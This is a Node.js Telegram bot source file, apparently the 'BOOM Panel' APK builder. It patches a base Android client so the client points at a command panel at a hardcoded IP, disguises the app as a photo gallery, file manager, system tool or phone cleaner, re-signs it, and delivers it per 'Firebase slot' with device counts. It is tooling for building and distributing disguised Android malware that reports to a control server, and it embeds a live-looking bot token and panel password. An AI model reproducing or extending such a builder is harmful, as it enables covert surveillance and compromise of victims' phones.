require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const AdmZip = require('adm-zip');

const BOT_TOKEN = process.env.APK_BOT_TOKEN || '8800684024:AAHjQ3h43RAYFHvAOzMPE7ZR2-PT8za2y-8';
const PANEL_URL = process.env.PANEL_URL || 'http://187.77.155.206:3000';
const PANEL_ADMIN = process.env.PANEL_ADMIN || 'admin';
const PANEL_PASS = process.env.PANEL_PASS || 'boom@2025';
const BASE_APK_PATH = process.env.BASE_APK_PATH || path.join(__dirname, 'base', 'client-base.apk');
const KEYSTORE_PATH = path.join(__dirname, 'keys', 'release.jks');
const WORK_DIR = path.join(__dirname, 'work');
const OUT_DIR = path.join(__dirname, 'output');

[WORK_DIR, OUT_DIR, path.join(__dirname, 'keys')].forEach(d => fs.mkdirSync(d, { recursive: true }));

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Session store: chatId -> { step, username, password, apkType, slotId, slotName }
const sessions = new Map();

const APK_TYPES = [
  { id: 'gallery', label: '📸 Photo Gallery' },
  { id: 'files',   label: '📁 File Manager' },
  { id: 'system',  label: '⚙️  System Tools' },
  { id: 'cleaner', label: '🧹 Phone Cleaner' }
];

async function panelLogin(username, password) {
  try {
    const r = await axios.post(`${PANEL_URL}/api/auth/login`, { username, password }, { timeout: 8000 });
    return r.data.token;
  } catch {
    return null;
  }
}

async function getFirebaseSlots(token) {
  try {
    const r = await axios.get(`${PANEL_URL}/api/firebase`, {
      headers: { Authorization: `Bearer ${token}` },
      timeout: 8000
    });
    return Array.isArray(r.data) ? r.data : [];
  } catch {
    return [];
  }
}

function ensureKeystore() {
  if (fs.existsSync(KEYSTORE_PATH)) return;
  try {
    execSync(
      `keytool -genkey -v -keystore ${KEYSTORE_PATH} -alias boom -keyalg RSA -keysize 2048 -validity 10000 ` +
      `-dname "CN=BOOM,OU=Dev,O=BOOM,L=IN,ST=IN,C=IN" -storepass boom1234 -keypass boom1234 2>/dev/null`,
      { stdio: 'pipe' }
    );
  } catch (e) {
    console.error('Keystore gen failed:', e.message);
  }
}

function patchApk(serverUrl, apkType, slotId, outputName) {
  const workId = Date.now().toString();
  const decompDir = path.join(WORK_DIR, workId);
  const outApk = path.join(OUT_DIR, outputName);

  try {
    execSync(`apktool d -f "${BASE_APK_PATH}" -o "${decompDir}"`, { stdio: 'pipe' });

    const smaliFiles = findSmali(decompDir);
    for (const f of smaliFiles) {
      let content = fs.readFileSync(f, 'utf8');
      content = content.replace(/http:\/\/187\.77\.155\.206:3000/g, serverUrl);
      if (f.includes('Prefs') || f.includes('Config')) {
        content = content.replace(/const-string v\d+, "gallery"/g, m => m.replace('gallery', apkType));
      }
      fs.writeFileSync(f, content);
    }

    const stringsPath = path.join(decompDir, 'res', 'values', 'strings.xml');
    if (fs.existsSync(stringsPath)) {
      let s = fs.readFileSync(stringsPath, 'utf8');
      const label = APK_TYPES.find(t => t.id === apkType)?.label.replace(/[^ -~]/g, '') || apkType;
      s = s.replace(/<string name="app_name">.*?<\/string>/, `<string name="app_name">${label.replace(/[^\w ]/g, '').trim()}</string>`);
      fs.writeFileSync(stringsPath, s);
    }

    ensureKeystore();
    execSync(`apktool b "${decompDir}" -o "${outApk}.unsigned.apk"`, { stdio: 'pipe' });
    execSync(`zipalign -v 4 "${outApk}.unsigned.apk" "${outApk}.aligned.apk"`, { stdio: 'pipe' });
    execSync(
      `apksigner sign --ks ${KEYSTORE_PATH} --ks-pass pass:boom1234 --key-pass pass:boom1234 ` +
      `--out "${outApk}" "${outApk}.aligned.apk"`,
      { stdio: 'pipe' }
    );

    return outApk;
  } finally {
    try { fs.rmSync(decompDir, { recursive: true, force: true }); } catch {}
    try { fs.unlinkSync(`${outApk}.unsigned.apk`); } catch {}
    try { fs.unlinkSync(`${outApk}.aligned.apk`); } catch {}
  }
}

function findSmali(dir) {
  const results = [];
  const walk = (d) => {
    for (const f of fs.readdirSync(d)) {
      const full = path.join(d, f);
      if (fs.statSync(full).isDirectory()) walk(full);
      else if (f.endsWith('.smali')) results.push(full);
    }
  };
  walk(dir);
  return results;
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  sessions.set(chatId, { step: 'await_username' });
  bot.sendMessage(chatId,
    '💥 *BOOM Panel — APK Generator*\n\nPanel username daalo:',
    { parse_mode: 'Markdown' }
  );
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  if (text.startsWith('/')) return;

  const session = sessions.get(chatId);
  if (!session) {
    bot.sendMessage(chatId, '/start se shuru karo');
    return;
  }

  switch (session.step) {

    case 'await_username':
      session.username = text;
      session.step = 'await_password';
      bot.sendMessage(chatId, '🔑 Password:');
      break;

    case 'await_password': {
      session.password = text;
      bot.sendMessage(chatId, '⏳ Verify kar raha hoon...');
      const token = await panelLogin(session.username, session.password);
      if (!token) {
        sessions.delete(chatId);
        bot.sendMessage(chatId, '❌ Login failed. /start se dobara try karo.');
        return;
      }
      session.token = token;
      session.step = 'await_apk_type';

      const keyboard = APK_TYPES.map(t => [{ text: t.label, callback_data: `apk_${t.id}` }]);
      bot.sendMessage(chatId, '📱 APK type select karo:', {
        reply_markup: { inline_keyboard: keyboard }
      });
      break;
    }

    default:
      break;
  }
});

bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  const session = sessions.get(chatId);
  if (!session) return;

  bot.answerCallbackQuery(query.id);

  if (data.startsWith('apk_') && session.step === 'await_apk_type') {
    session.apkType = data.replace('apk_', '');
    session.step = 'await_slot';

    const slots = await getFirebaseSlots(session.token);
    if (slots.length === 0) {
      bot.sendMessage(chatId, '⚠️ Koi Firebase slot nahi mila. Pehle panel mein slot add karo.');
      sessions.delete(chatId);
      return;
    }

    session.slots = slots;
    const keyboard = slots.map(s => [{
      text: `🔥 ${s.name} (${s.deviceCount || 0}/${s.maxDevices} devices)`,
      callback_data: `slot_${s._id}`
    }]);

    bot.sendMessage(chatId, '🔥 Firebase slot select karo:', {
      reply_markup: { inline_keyboard: keyboard }
    });
  }

  else if (data.startsWith('slot_') && session.step === 'await_slot') {
    const slotId = data.replace('slot_', '');
    const slot = session.slots.find(s => s._id === slotId);
    session.slotId = slotId;
    session.slotName = slot?.name || slotId;
    session.step = 'await_confirm';

    const apkLabel = APK_TYPES.find(t => t.id === session.apkType)?.label || session.apkType;
    bot.sendMessage(chatId,
      `✅ *Confirm karo:*\n\n` +
      `📱 APK Type: *${apkLabel}*\n` +
      `🔥 Firebase Slot: *${session.slotName}*\n` +
      `🌐 Server: \`${PANEL_URL}\`\n\n` +
      `APK build karein?`,
      {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [{ text: '✅ Haan, Build Karo!', callback_data: 'confirm_build' }],
            [{ text: '❌ Cancel', callback_data: 'cancel' }]
          ]
        }
      }
    );
  }

  else if (data === 'confirm_build' && session.step === 'await_confirm') {
    session.step = 'building';

    await bot.sendMessage(chatId, '⚙️ APK build ho rahi hai... thoda wait karo (1-2 min)');

    const outputName = `boom_client_${session.apkType}_${Date.now()}.apk`;

    setTimeout(async () => {
      try {
        if (!fs.existsSync(BASE_APK_PATH)) {
          await bot.sendMessage(chatId,
            '⚠️ Base APK server par nahi mila.\n\n' +
            'Pehle Android Studio se client APK build karo aur isse path par rakh do:\n' +
            `\`${BASE_APK_PATH}\`\n\n` +
            'Tab bot automatically patch karke bhej dega.'
          );
          sessions.delete(chatId);
          return;
        }

        const apkPath = patchApk(PANEL_URL, session.apkType, session.slotId, outputName);
        await bot.sendDocument(chatId, apkPath, {
          caption: `✅ *APK Ready!*\n\n📱 Type: ${session.apkType}\n🔥 Slot: ${session.slotName}\n🌐 Server: ${PANEL_URL}`,
          parse_mode: 'Markdown'
        });
        fs.unlinkSync(apkPath);
      } catch (err) {
        await bot.sendMessage(chatId, `❌ Build failed: ${err.message}\n\nApktool installed hai VPS par?`);
      }
      sessions.delete(chatId);
    }, 100);
  }

  else if (data === 'cancel') {
    sessions.delete(chatId);
    bot.sendMessage(chatId, 'Cancel. /start se naya APK banao.');
  }
});

console.log('BOOM APK Bot running...');
